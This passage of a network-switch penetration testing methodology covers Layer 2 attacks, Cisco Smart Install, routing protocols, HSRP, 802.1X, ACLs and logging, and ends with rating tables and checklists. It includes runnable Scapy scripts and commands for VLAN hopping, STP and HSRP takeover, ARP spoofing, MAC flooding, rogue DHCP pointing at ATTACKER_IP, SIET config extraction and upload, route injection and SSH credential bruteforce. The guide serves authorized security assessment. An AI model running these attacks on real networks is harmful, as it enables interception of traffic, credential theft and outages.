target_vlan = 100     # VLAN you want to reach
target_ip = "10.10.100.1"

packet = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    Dot1Q(vlan=native_vlan) /      # Outer tag — stripped by switch
    Dot1Q(vlan=target_vlan) /      # Inner tag — forwarded to target VLAN
    IP(dst=target_ip) /
    ICMP()
)
sendp(packet, iface="eth0")
print("Double-tagged VLAN hop packet sent")
EOF

# Alternative: Using Yersinia
yersinia -G
# → Select 802.1Q → Launch double tagging attack
```

**Expected Secure Output:**
```
# Ping to target_ip in target VLAN receives no response
# Switch has native VLAN NOT set to VLAN 1 (using dedicated native VLAN like 999)
# Access ports not configured as trunk — no VLAN hopping possible
```

**Expected Vulnerable Output:**
```
# Ping response received from target VLAN IP
# Traffic successfully delivered across VLAN boundary without authorization
Reply from 10.10.100.1: bytes=32 time=1ms
```

**Vulnerable Signs:**
- Any ICMP / ARP reply from target VLAN → VLAN hop successful → Critical finding

---

## 8.2 STP (Spanning Tree Protocol) Attack — Root Bridge Takeover

**What this does and why:**
Spanning Tree Protocol is used by switches to prevent broadcast loops. The switch with the lowest Bridge ID becomes the Root Bridge — and all traffic flows through the root. If an attacker can become the root bridge, all traffic is routed through the attacker's machine, enabling a man-in-the-middle attack on the entire network segment.

> ⚠️ This attack can cause brief network disruption (5–30 seconds convergence). Only run in maintenance window if possible.

```bash
# Method 1: Yersinia STP attack (GUI)
yersinia -G
# → Select STP → Claim Root Role → Launch

# Method 2: Scapy — send BPDU with priority 0 (lowest = becomes root)
python3 << 'EOF'
from scapy.all import *
from scapy.contrib.spanning_tree import *

# Craft BPDU with priority 0 — our machine claims root
bpdu = (
    Ether(dst="01:80:c2:00:00:00", src=get_if_hwaddr("eth0")) /
    LLC(dsap=0x42, ssap=0x42, ctrl=3) /
    STP(bpdutype=0x00, bpduflags=0x01,
        rootid=0x0000,                      # Priority 0 — take root
        rootmac=get_if_hwaddr("eth0"),
        pathcost=0,
        bridgeid=0x0000,
        bridgemac=get_if_hwaddr("eth0"),
        portid=0x8001,
        age=0, maxage=20, hellotime=2, fwddelay=15)
)
sendp(bpdu, iface="eth0", inter=2, loop=1)
EOF

# Monitor STP topology changes
# Start Wireshark → filter: stp
# Watch for Topology Change Notifications (TCN) — indicates instability
```

**Expected Secure Output:**
```
BPDU Guard active on access ports — attacker port immediately err-disabled
Root Guard active on uplink ports — root bridge unchanged
Wireshark: No STP response to injected BPDUs
```

**Expected Vulnerable Output:**
```
# Network convergence event observed
# Wireshark shows new Root Bridge = attacker MAC address
# Switch accepts our BPDU — we are now root bridge
# All inter-switch traffic now passes through attacker machine
```

**Vulnerable Signs:**
- STP topology change triggered → BPDU Guard not enabled → High
- Root bridge role accepted from attacker port → Root Guard not enabled → Critical
- Traffic visible in Wireshark after root takeover → confirmed MitM → Critical

---

## 8.3 ARP Spoofing / ARP Cache Poisoning

**What this does and why:**
ARP has no authentication. An attacker can send gratuitous ARP replies claiming that their MAC address corresponds to the default gateway IP — poisoning the ARP cache of all hosts in the subnet. All traffic destined for the gateway then goes to the attacker first, enabling man-in-the-middle interception of all communications.

```bash
# Step 1: Identify default gateway and target host IPs
arp -n
ip route
# Or from SNMP ARP table (Phase 2.3)

# Step 2: Perform ARP spoofing
# Using arpspoof (dsniff package)
echo 1 > /proc/sys/net/ipv4/ip_forward    # Enable IP forwarding — act as router
arpspoof -i eth0 -t <TARGET_HOST_IP> <GATEWAY_IP> &     # Tell target: we are the gateway
arpspoof -i eth0 -t <GATEWAY_IP> <TARGET_HOST_IP> &     # Tell gateway: we are the target

# Step 3: Capture all traffic passing through attacker machine
tcpdump -i eth0 -w arp_mitm_capture.pcap not arp

# Step 4: Open in Wireshark → look for HTTP credentials, cleartext passwords, NTLMv2 hashes

# Using Bettercap (more modern — automated):
bettercap -iface eth0
# In bettercap shell:
# net.probe on
# set arp.spoof.targets <TARGET_IP>
# arp.spoof on
# net.sniff on
```

**Expected Secure Output:**
```
# Dynamic ARP Inspection (DAI) active on switch
# Gratuitous ARPs blocked — arp table not poisoned on targets
# ARP reply from attacker discarded — MAC does not match DHCP binding
```

**Expected Vulnerable Output:**
```
# ARP spoofing successful
# Target host ARP cache shows: gateway IP → attacker MAC
arp -n (on target): 192.168.1.1 ether aa:bb:cc:dd:ee:ff C eth0
# Traffic intercepted — HTTP passwords, NTLMv2 hashes visible in capture
```

**Vulnerable Signs:**
- ARP cache poisoning succeeds → Dynamic ARP Inspection not configured → High
- Traffic intercepted from other hosts → Critical (active MitM confirmed)

---

## 8.4 MAC Flooding Attack

**What this does and why:**
Switches maintain a CAM (Content Addressable Memory) table mapping MAC addresses to ports. This table has a finite size. When it is full, the switch fails open — it broadcasts all frames out every port (becomes a hub). This allows the attacker to capture all traffic in the VLAN.

> ⚠️ This attack can temporarily disrupt network operations. Confirm approval and perform in maintenance window.

```bash
# Using macof (from dsniff package)
macof -i eth0 -n 10000
# Generates 10,000 random MAC-IP ARP pairs to flood the CAM table

# Monitor effectiveness — watch switch for flooding behavior
tcpdump -i eth0 -nn not arp | head -100
# If you start seeing traffic from OTHER hosts → CAM table flooded → switch broadcasting all frames
```

**Expected Secure Output:**
```
# Port Security configured — after X MAC addresses, port is err-disabled or traffic blocked
# Only legitimate MAC addresses allowed per port
# Attack ineffective — attacker port shut down
```

**Expected Vulnerable Output:**
```
# After macof run — traffic from other hosts visible in tcpdump
# Hosts from other ports' conversations visible on attacker interface
# Switch is broadcasting all frames (hardware acting as hub)
```

**Vulnerable Signs:**
- Traffic from unrelated hosts visible after CAM flood → Port Security not configured → High

---

## 8.5 DHCP Starvation & Rogue DHCP

**What this does and why:**
DHCP Starvation exhausts the DHCP pool by requesting all available IP addresses using spoofed MAC addresses. Legitimate clients then cannot get an IP address. Following this with a rogue DHCP server allows the attacker to hand out IP addresses with a malicious gateway or DNS server — effectively man-in-the-middle'ing all new connections.

```bash
# Step 1: DHCP Starvation — exhaust the pool
yersinia -G
# → DHCP → Send DISCOVER packet (enable loop)
# Or: dhcpstarv -i eth0

# Step 2: After starvation — set up rogue DHCP server
# Install dnsmasq and configure:
cat > /tmp/rogue_dhcp.conf << EOF
interface=eth0
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,<ATTACKER_IP>      # Gateway = attacker
dhcp-option=6,<ATTACKER_IP>      # DNS = attacker
EOF
dnsmasq -C /tmp/rogue_dhcp.conf --no-daemon

# Step 3: Enable IP forwarding and start capturing
echo 1 > /proc/sys/net/ipv4/ip_forward
tcpdump -i eth0 -w rogue_dhcp_capture.pcap

# Test DNS hijacking (if rogue DNS also set up):
# New DHCP clients will use attacker as DNS → full traffic interception
```

**Expected Secure Output:**
```
DHCP Snooping configured — untrusted ports drop DHCP server messages
Starvation attempt fails — only trusted DHCP server responds
New client gets IP from legitimate server
```

**Expected Vulnerable Output:**
```
DHCP pool exhausted — legitimate clients cannot get IPs (service disruption)
Rogue DHCP responds to new clients with attacker as gateway
New host traffic routed through attacker machine — confirmed MitM
```

---

# Phase 9 — Cisco Smart Install (Critical)

## 9.1 Smart Install Detection and Exploitation

**What this does and why:**
Cisco Smart Install is a legacy plug-and-play configuration feature that listens on TCP port 4786. It was designed for zero-touch provisioning of new switches. The critical problem: **Smart Install has no authentication whatsoever**. An attacker can use it to:
- Retrieve the device's running configuration
- Change the configuration
- Execute TFTP operations
- In some versions — execute arbitrary commands

This is one of the most dangerous vulnerabilities in Cisco switch environments.

```bash
# Step 1: Detect Smart Install
nmap -p4786 <SWITCH_IP>
nmap -p4786 <SUBNET_CIDR>   # Scan whole subnet

# Step 2: Confirm it's a Smart Install service
echo "show version" | nc -w3 <SWITCH_IP> 4786

# Step 3: Use cisco-torch or Smart Install Exploitation Tool
# Option A: Cisco-torch
cisco-torch -A <SWITCH_IP>

# Option B: SIET (Smart Install Exploitation Tool)
git clone https://github.com/Sab0tag3d/SIET
cd SIET && pip install -r requirements.txt

# Get running config (no credentials needed)
python3 siet.py -g -i <SWITCH_IP>

# Change device config (critical impact)
python3 siet.py -a -f malicious_config.txt -i <SWITCH_IP>

# Upgrade IOS image via TFTP
python3 siet.py -u -i <SWITCH_IP>
```

**Expected Secure Output:**
```
4786/tcp filtered — Smart Install disabled or not listening
echo test to port 4786 → no response / connection refused
```

**Expected Vulnerable / Critical Output:**
```
4786/tcp open — Smart Install listening
python3 siet.py -g → Config file received:
  enable secret 5 $1$...
  username admin privilege 15 password 0 cisco
  snmp-server community public RW
Full configuration downloaded WITHOUT credentials
```

> ⚠️ **Critical Finding:** Unauthenticated full configuration access and potential remote code execution. This is a standalone critical finding.

---

# Phase 10 — Routing Protocol Testing

## 10.1 RIP (Routing Information Protocol) Vulnerability

**What this does and why:**
RIP v1 has no authentication. RIP v2 supports authentication but it is often not configured. An attacker who can inject false routing updates can redirect traffic for entire subnets through the attacker's machine.

```bash
# Step 1: Detect RIP
nmap -sU -p520,521 <SWITCH_IP>
tcpdump -i eth0 udp port 520 -v    # Listen for RIP broadcasts

# Step 2: If RIP v1 detected — inject false route with Scapy
python3 << 'EOF'
from scapy.all import *

# Send a RIP update claiming to be the best route to 10.0.0.0/8
rip_update = (
    IP(src="<YOUR_IP>", dst="255.255.255.255") /
    UDP(sport=520, dport=520) /
    RIP(cmd=2, version=1) /
    RIPEntry(AF=2, addr="10.0.0.0", mask="0.0.0.0", metric=1)
)
send(rip_update, iface="eth0", count=5)
print("RIP injection sent")
EOF
```

**Expected Secure Output:**
```
RIP not running — no UDP 520 traffic observed
If RIP v2 used: Authentication configured (MD5 key-chain)
Injected route not accepted — authentication failure
```

**Expected Vulnerable Output:**
```
RIP v1 traffic observed — no authentication in headers
Injected route accepted by router — false route installed
Traffic for 10.0.0.0/8 now routed through attacker
```

---

## 10.2 OSPF Authentication Check

**What this does and why:**
OSPF (Open Shortest Path First) carries the entire network topology. Without authentication, an attacker can inject false LSAs (Link State Advertisements) to redirect routing, perform black-holing, or create routing loops.

```bash
# Detect OSPF packets (uses IP protocol 89 — not TCP/UDP)
tcpdump -i eth0 proto 89 -v -n

# If OSPF packets observed — check for authentication field
# In Wireshark: filter ospf → look at Auth Type field in OSPF header
# Auth Type 0 = No authentication
# Auth Type 1 = Plain text (password visible)
# Auth Type 2 = MD5 (secure)

# Test OSPF injection (no auth scenario)
python3 << 'EOF'
from scapy.all import *
from scapy.contrib.ospf import *

# Send Hello packet — if accepted, we become an OSPF neighbor
hello = (
    IP(dst="224.0.0.5", proto=89) /
    OSPF_Hdr(src="<YOUR_IP>", area="0.0.0.0") /
    OSPF_Hello(hellointerval=10, deadinterval=40, mask="255.255.255.0")
)
send(hello, iface="eth0")
EOF
```

**Expected Secure Output:**
```
OSPF Auth Type: 2 (MD5 cryptographic authentication)
Injected Hello packet ignored — not authenticated
No OSPF adjacency formed with attacker
```

**Expected Vulnerable Output:**
```
OSPF Auth Type: 0 (No Authentication)
OSPF adjacency formed with attacker machine
DB Description exchange seen — attacker is now OSPF neighbor
```

---

## 10.3 BGP Testing (If Exposed)

**What this does and why:**
BGP (Border Gateway Protocol) is used between core infrastructure and ISPs, or between data centers. BGP has no strong authentication by default. BGP hijacking is a serious attack allowing rerouting of entire IP address blocks.

```bash
# Detect BGP
nmap -p179 <SWITCH_IP>

# If BGP is exposed — check if it accepts unauthenticated connections
telnet <SWITCH_IP> 179

# Check for MD5 authentication (should be configured between peers)
nmap --script bgp-open -p179 <SWITCH_IP>
```

**Expected Secure Output:**
```
179/tcp filtered — BGP not exposed externally
BGP sessions use MD5 authentication
BGP TTL Security configured (only accept from direct neighbors)
```

**Expected Vulnerable Output:**
```
179/tcp open — BGP accepting connections from unauthorized hosts
No MD5 authentication on BGP sessions
BGP OPEN message accepted from attacker — potential BGP hijack surface
```

---

# Phase 11 — HSRP / VRRP Protocol Testing

## 11.1 HSRP/VRRP Active Gateway Takeover

**What this does and why:**
HSRP (Hot Standby Router Protocol) and VRRP (Virtual Router Redundancy Protocol) provide default gateway redundancy. They elect an active router using a priority value. If an attacker can send HSRP/VRRP messages claiming a higher priority, they become the active router — and all network traffic passes through them.

HSRP v1 uses MD5 authentication optionally (commonly not configured). HSRP v2 is more secure but still commonly misconfigured.

```bash
# Detect HSRP/VRRP
tcpdump -i eth0 udp port 1985 -v      # HSRP
tcpdump -i eth0 proto 112 -v          # VRRP

# Also in Wireshark — filter: hsrp or vrrp

# If HSRP detected without authentication — inject takeover packet with Scapy
python3 << 'EOF'
from scapy.all import *
from scapy.contrib.hsrp import *

# Claim priority 255 (max) — become the active gateway
hsrp_takeover = (
    IP(src="<YOUR_IP>", dst="224.0.0.2") /   # HSRP multicast
    UDP(sport=1985, dport=1985) /
    HSRP(version=0, opcode=0,           # Hello
         state=16,                       # Active state
         priority=255,                  # Highest priority — we become active
         group=1,                        # Same group as switch (from captured packets)
         virtualIP="<HSRP_VIP>")        # Virtual IP from captured HSRP traffic
)
send(hsrp_takeover, iface="eth0", inter=3, loop=1)
print("HSRP takeover attempt running")
EOF
# Monitor: if attacker machine becomes gateway → all traffic flows through attacker
```

**Expected Secure Output:**
```
HSRP v2 with MD5 authentication configured
Injected packet rejected — authentication mismatch
Active router unchanged
VRRP: Authentication configured
```

**Expected Vulnerable Output:**
```
HSRP traffic observed with no authentication
Priority injection accepted
attacker machine elected as Active Router
Virtual IP now responds to ARP for attacker MAC
All hosts using this gateway route traffic through attacker
```

---

# Phase 12 — Port Security & 802.1X Testing

## 12.1 Port Security Detection

**What this does and why:**
Port security limits the number of MAC addresses per switch port. Without it, MAC flooding and rogue device connection attacks succeed. Testing confirms whether port security is enforced.

```bash
# Test by connecting and generating multiple MAC addresses
# If port security is enforced — port should err-disable after threshold exceeded
macof -i eth0 -n 20    # Send 20 frames with random MACs from your interface
# Observe: does your port become err-disabled? If not — port security absent

# Check if your port is err-disabled after MAC flood
# (If you lose connectivity → port security triggered → that's actually secure behavior)
```

**Expected Secure Output:**
```
Port err-disabled after MAC threshold exceeded
Port security violation: restrict / shutdown configured
Log message generated: Port security violation on Gi1/0/12
```

**Expected Vulnerable Output:**
```
20+ MAC addresses accepted on same port — no violation triggered
No connectivity loss — port security not configured
CAM table fills up → switch broadcasts all frames (confirmed MAC flood success)
```

---

## 12.2 802.1X Authentication Bypass Testing

**What this does and why:**
802.1X is port-based network access control — only authenticated devices can join the network. Without it, any device physically plugged into a switch port gets network access. This tests whether physical security controls are enforced.

```bash
# Step 1: Plug into a switch port with a fresh machine (no 802.1X supplicant configured)
# Try to get DHCP and reach the network without any authentication

dhclient eth0     # Request IP
ping <GATEWAY_IP>  # Test connectivity

# Step 2: Test MAC authentication bypass (MAB) — some configs allow unauthenticated devices
# after a timeout period
# Wait 60 seconds after plugging in — does the port auto-authorize?

# Step 3: Check if 802.1X is even sending EAP challenges
tcpdump -i eth0 ether proto 0x888e    # Filter EAP / 802.1X frames
# If no EAP frames seen → 802.1X not configured → unauthenticated access
```

**Expected Secure Output:**
```
EAP Identity Request received immediately on port connect (802.1X active)
Without valid credentials — port stays in unauthorized VLAN only
Ping to internal network fails — no access without authentication
```

**Expected Vulnerable Output:**
```
No EAP frames received — 802.1X not configured
DHCP address received immediately — no authentication required
Full network access from unauthenticated machine
```

---

# Phase 13 — ACL & Firewall Rule Testing

## 13.1 ACL Bypass Testing

**What this does and why:**
Core switches often have ACLs (Access Control Lists) to restrict inter-VLAN traffic. ACLs with broad rules, incorrect ordering, or missing rules allow unauthorized access to restricted segments. Testing involves probing restricted services from your test position.

```bash
# Map what should be blocked based on network documentation or inferred from architecture
# Test each blocked path:

# Should be blocked — test if it is:
nmap -Pn -p22,23,80,443,3389,445,161 <RESTRICTED_SUBNET_CIDR>

# Test ICMP across VLAN boundaries
ping <IP_IN_RESTRICTED_VLAN>

# Test high-value ports that should be restricted to specific source IPs
nmap -Pn -p1433,3306,5432,6379,27017 <DATABASE_SUBNET_CIDR>

# Test management VLAN accessibility from user VLAN
nmap -Pn -p22,23,443 <MANAGEMENT_VLAN_CIDR>
```

**Expected Secure Output:**
```
All restricted subnet ports: filtered
Management VLAN unreachable from user VLAN — ACL blocking
Database ports unreachable from user workstation — segmentation enforced
```

**Expected Vulnerable Output:**
```
22/tcp open on management switch — reachable from user VLAN (no ACL)
Database port 1433 reachable from user workstation subnet
No ACL between VLANs — flat network effectively (all hosts can reach all hosts)
```

---

# Phase 14 — Logging & Monitoring Detection

## 14.1 Determine if Attack Activity is Being Logged

**What this does and why:**
Switches without adequate logging do not detect or alert on attacks. Testing whether your activities generate alerts tells you if the security monitoring is effective — a key finding for the blue team assessment component.

```bash
# Perform a noisy scan and check if any alerts are triggered during testing
# (Coordinate with client to verify if alerts were received)
nmap -A <SWITCH_IP>

# Test if syslog is configured by checking for UDP 514 traffic going out
tcpdump -i eth0 udp port 514

# Test SNMP traps (if switch sends alerts to SNMP manager)
# Intentionally trigger an event (e.g., failed login) and check if trap is sent
tcpdump -i eth0 udp port 162    # Watch for SNMP trap messages sent by switch
```

**Expected Secure Output:**
```
Syslog traffic observed going to management server on UDP 514
SNMP trap sent after failed authentication attempt
SOC team confirms alert received for port scan activity
```

**Expected Vulnerable Output:**
```
No syslog traffic on UDP 514 — logging not configured
No SNMP traps observed after security event
Failed login attempts not logged — stealth attacks possible
SOC team confirms no alerts received — monitoring not effective
```

---

# Phase 15 — Metasploit Auxiliary Modules for Switches

## 15.1 Metasploit Switch-Specific Checks

**What this does and why:**
Metasploit includes many auxiliary scanner modules for network devices that consolidate multiple checks into a single run. These are safe scanner modules — they do not exploit, they detect.

```bash
msfconsole

# SNMP enumeration
msf> use auxiliary/scanner/snmp/snmp_enum
msf> set RHOSTS <SWITCH_IP>
msf> set COMMUNITY public
msf> run

# SNMP user enumeration
msf> use auxiliary/scanner/snmp/snmp_enumusers
msf> set RHOSTS <SWITCH_IP>
msf> run

# Cisco username enumeration via SNMP
msf> use auxiliary/scanner/snmp/cisco_username_enum
msf> set RHOSTS <SWITCH_IP>
msf> run

# Cisco Smart Install detection
msf> use auxiliary/scanner/misc/cisco_smart_install
msf> set RHOSTS <SWITCH_IP>
msf> set RPORT 4786
msf> run

# Telnet banner grabber
msf> use auxiliary/scanner/telnet/telnet_version
msf> set RHOSTS <SWITCH_IP>
msf> run

# SSH version scan
msf> use auxiliary/scanner/ssh/ssh_version
msf> set RHOSTS <SWITCH_IP>
msf> run

# Default SSH credentials check
msf> use auxiliary/scanner/ssh/ssh_login
msf> set RHOSTS <SWITCH_IP>
msf> set USER_FILE /usr/share/metasploit-framework/data/wordlists/default_users_for_services.txt
msf> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/default_pass_for_services.txt
msf> set STOP_ON_SUCCESS true
msf> run
```

---

# Phase 16 — Physical Security Indicators (Observed During Testing)

## 16.1 Physical Access Considerations

**What this does and why:**
Physical security of the switch is part of the overall security posture. Even the most hardened switch can be compromised if physical access is uncontrolled.

**Document and photograph the following if within scope:**
- Is the switch in a locked rack / cage?
- Is the rack room locked with access control?
- Are console ports (RJ-45, mini-USB) accessible from outside the rack?
- Are unused ports left active? (Test: plug in and get network access — Phase 12.2)
- Is the switch labeled with IP addresses, VLANs, or management credentials?
- Is there a console cable left connected to an unlocked laptop?

**Vulnerable Signs:**
- Console port accessible without physical lock → anyone can connect, bypass all authentication
- Unused ports active → rogue device connection → potential full network access
- Switch in unlocked room → power cycle / password recovery possible

---

# Evidence Collection

Every finding must be documented with:

| Field | Required |
|-------|---------|
| Phase and test name | ✅ |
| Full command used | ✅ |
| Complete raw output | ✅ |
| Screenshot or terminal capture | ✅ |
| Timestamp (UTC) | ✅ |
| Target IP / Hostname | ✅ |
| Protocol and port affected | ✅ |
| CVE reference (if applicable) | ✅ |
| CVSS Score | ✅ |
| Business Impact statement | ✅ |
| Step-by-step reproduction steps | ✅ |
| Remediation recommendation | ✅ |

---

# Risk Rating Reference

| Rating | CVSS | Switch-Specific Examples |
|--------|------|--------------------------|
| Critical | 9.0–10.0 | Cisco Smart Install RCE (unauth), SNMP write + config download, STP root takeover + MitM confirmed, VLAN hop to restricted VLAN, default credentials accepted |
| High | 7.0–8.9 | Telnet enabled (cleartext creds), SNMP public community read, ARP spoofing (no DAI), HSRP takeover, OSPF/RIP without auth |
| Medium | 4.0–6.9 | SSH weak algorithms, TLS 1.0/1.1, CDP on user ports, DHCP snooping absent, no 802.1X, NTP monlist, HTTP management panel |
| Low | 0.1–3.9 | Version disclosure in banner, NTP info leakage, LLDP on edge ports, login banner absent |
| Informational | N/A | ICMP responses, hardware model fingerprinted, syslog configured to wrong destination |

---

# Quick Reference Checklist

**Phase 1 — Discovery & Fingerprinting**
- [ ] Host discovery (ICMP + TCP probes + ARP)
- [ ] Full TCP port scan (all 65535 ports)
- [ ] UDP scan (69, 123, 161, 162, 520)
- [ ] Service and version detection
- [ ] Device model and OS fingerprinting

**Phase 2 — SNMP**
- [ ] Community string bruteforce (v1 and v2c)
- [ ] Full SNMP walk (system info, interfaces, routing)
- [ ] VLAN table extraction via SNMP
- [ ] Config download via SNMP write + TFTP
- [ ] SNMPv3 user enumeration

**Phase 3 — Management Protocols**
- [ ] Telnet detection + cleartext capture
- [ ] SSH version and algorithm weakness check
- [ ] Default credential testing (SSH, Telnet, Web)
- [ ] Enable password weakness test

**Phase 4 — Web Interface**
- [ ] HTTP/HTTPS panel detection
- [ ] TLS configuration (testssl.sh)
- [ ] Security headers check
- [ ] HTTP methods check
- [ ] Directory discovery and hidden paths

**Phase 5 — TFTP**
- [ ] TFTP service detection
- [ ] Anonymous file download test
- [ ] File upload test

**Phase 6 — NTP**
- [ ] Monlist (amplification) check
- [ ] Mode 6 info query
- [ ] Authentication status

**Phase 7 — CDP / LLDP**
- [ ] CDP packet capture and analysis
- [ ] LLDP packet capture and analysis
- [ ] Information disclosure assessment

**Phase 8 — Layer 2 Attacks**
- [ ] VLAN hopping (double tagging)
- [ ] STP root bridge takeover
- [ ] ARP spoofing / cache poisoning
- [ ] MAC flooding (CAM overflow)
- [ ] DHCP starvation + rogue DHCP

**Phase 9 — Cisco Smart Install**
- [ ] Port 4786 detection
- [ ] Config extraction (unauthenticated)

**Phase 10 — Routing Protocols**
- [ ] RIP detection and injection test
- [ ] OSPF authentication check
- [ ] BGP exposure check

**Phase 11 — HSRP / VRRP**
- [ ] HSRP/VRRP packet detection
- [ ] Authentication check
- [ ] Gateway takeover test

**Phase 12 — Port Security & 802.1X**
- [ ] Port security enforcement test (MAC flood)
- [ ] 802.1X bypass test (unauthenticated device)

**Phase 13 — ACL Testing**
- [ ] Inter-VLAN traffic restrictions
- [ ] Management VLAN isolation
- [ ] Database/server subnet restrictions

**Phase 14 — Logging**
- [ ] Syslog configuration confirmed
- [ ] SNMP trap testing
- [ ] SOC alert confirmation

**Phase 15 — Metasploit Modules**
- [ ] SNMP enum modules
- [ ] Smart Install scanner
- [ ] SSH/Telnet version and credential modules

**Phase 16 — Physical**
- [ ] Physical access controls
- [ ] Unused port status
- [ ] Console port access

**Final**
- [ ] All findings documented with full evidence
- [ ] CVSS scored for each finding
- [ ] Remediation written for each finding
- [ ] Attack narrative written (what an attacker could achieve end-to-end)
